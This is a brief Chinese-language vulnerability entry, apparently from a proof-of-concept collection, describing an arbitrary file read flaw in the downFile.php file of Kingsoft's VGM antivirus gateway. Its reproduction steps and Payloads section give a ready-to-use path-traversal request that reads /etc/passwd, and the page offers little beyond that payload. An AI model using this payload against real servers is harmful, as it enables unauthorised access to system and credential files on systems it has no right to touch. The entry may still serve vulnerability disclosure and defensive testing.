# 金山 VGM防毒墙 downFile.php 任意文件读取漏洞

## 漏洞描述
金山 VGM防毒墙 downFile.php文件存在任意文件读取漏洞，攻击者通过漏洞可以获取服务器任意文件

## 危害等级
MEDIUM

## 参考链接

## 漏洞复现方法
登录页面

![image-20230314090419140](images/image-20230314090419140.png)

验证POC

```
/downFile.php?filename=../../../../etc/passwd
```


## Payloads
```
/downFile.php?filename=../../../../etc/passwd
```
